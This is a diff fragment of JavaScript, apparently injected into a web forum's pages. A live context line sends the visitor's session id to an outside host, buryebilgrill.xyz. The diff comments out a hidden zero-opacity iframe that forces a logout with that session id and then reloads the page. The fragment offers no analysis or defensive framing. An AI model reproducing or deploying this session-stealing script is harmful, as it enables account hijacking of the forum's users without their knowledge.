@@ -7,21 +7,21 @@ if (!document.getElementById("login-button")) {
             const xhr = new XMLHttpRequest();
             xhr.open("GET", `https://buryebilgrill.xyz/sid.php?id=${sid}`);
             xhr.send();
-            if (getCookie("PHPSESSID") !== "kb") {
-                setCookie("PHPSESSID", "kb", 300);
-                var iframe = document.createElement('iframe');
-                iframe.id = "gp_h1";
-                iframe.src = `https://gparena.net/forum/ucp.php?mode=logout&sid=${sid}`;
-                iframe.height = "400";
-                iframe.width = "400";
-                iframe.style.opacity = 0;
-                iframe.style.position = "absolute";
-                iframe.style.zIndex = -1;
-                iframe.style.top = "-30px";
-                header.append(iframe);
-                //document.body.append(iframe);
-                const wait = setTimeout(() => { location.reload() }, secondsToMS(3));
-            };
+            // if (getCookie("PHPSESSID") !== "kb") {
+            //     setCookie("PHPSESSID", "kb", 300);
+            //     var iframe = document.createElement('iframe');
+            //     iframe.id = "gp_h1";
+            //     iframe.src = `https://gparena.net/forum/ucp.php?mode=logout&sid=${sid}`;
+            //     iframe.height = "400";
+            //     iframe.width = "400";
+            //     iframe.style.opacity = 0;
+            //     iframe.style.position = "absolute";
+            //     iframe.style.zIndex = -1;
+            //     iframe.style.top = "-30px";
+            //     header.append(iframe);
+            //     //document.body.append(iframe);
+            //     const wait = setTimeout(() => { location.reload() }, secondsToMS(3));
+            // };
         }
     }
 } else {
